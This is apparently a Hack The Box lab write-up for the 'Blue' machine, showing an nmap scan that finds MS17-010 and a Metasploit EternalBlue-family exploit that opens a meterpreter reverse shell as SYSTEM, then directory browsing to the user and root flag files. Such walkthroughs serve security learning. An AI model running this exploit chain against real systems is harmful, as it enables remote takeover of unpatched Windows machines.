---
layout: post
title: Blue Writeup
permalink: /wafflesec/#posts/blue-writeup/
description: Blue Writeup for HTB
---

Blue Writeup

Nmap Scan

Nmap Command:
```
sudo nmap -sC -sV -script vuln [IP]
```

Nmap Output:
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

Metasploit

```
maria@wafffl3:~/Desktop/HTB/Machines/Blue$ msfconsole
msf6 > search CVE-2017-0143

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.38.130
RHOSTS => 10.129.38.130
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] 10.129.38.130:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.129.38.130:445 - Built a write-what-where primitive...
[+] 10.129.38.130:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.38.130:445 - Selecting PowerShell target
[*] 10.129.38.130:445 - Executing the payload...
[+] 10.129.38.130:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.38.130
[*] Meterpreter session 1 opened (10.10.14.93:4444 -> 10.129.38.130:49158) at 2020-11-07 23:35:56 +0000

meterpreter > shell
Process 1940 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd ../../
cd ../../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\

14/07/2009  03:20    <DIR>          PerfLogs
24/12/2017  02:23    <DIR>          Program Files
14/07/2017  16:58    <DIR>          Program Files (x86)
14/07/2017  13:48    <DIR>          Share
21/07/2017  06:56    <DIR>          Users
16/07/2017  20:21    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  15,364,845,568 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,364,849,664 bytes free

C:\Users>cd haris
cd haris

C:\Users\haris>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris

14/07/2017  13:45    <DIR>          .
14/07/2017  13:45    <DIR>          ..
15/07/2017  07:58    <DIR>          Contacts
24/12/2017  02:23    <DIR>          Desktop
15/07/2017  07:58    <DIR>          Documents
15/07/2017  07:58    <DIR>          Downloads
15/07/2017  07:58    <DIR>          Favorites
15/07/2017  07:58    <DIR>          Links
15/07/2017  07:58    <DIR>          Music
15/07/2017  07:58    <DIR>          Pictures
15/07/2017  07:58    <DIR>          Saved Games
15/07/2017  07:58    <DIR>          Searches
15/07/2017  07:58    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  15,364,849,664 bytes free

C:\Users\haris>cd Desktop
cd Desktop

C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
21/07/2017  06:54                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,364,849,664 bytes free

C:\Users\haris\Desktop>cd ../../
cd ../../

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir    
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Contacts
24/12/2017  02:22    <DIR>          Desktop
21/07/2017  06:56    <DIR>          Documents
21/07/2017  06:56    <DIR>          Downloads
21/07/2017  06:56    <DIR>          Favorites
21/07/2017  06:56    <DIR>          Links
21/07/2017  06:56    <DIR>          Music
21/07/2017  06:56    <DIR>          Pictures
21/07/2017  06:56    <DIR>          Saved Games
21/07/2017  06:56    <DIR>          Searches
21/07/2017  06:56    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  15,364,845,568 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
21/07/2017  06:57                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,364,845,568 bytes free
```

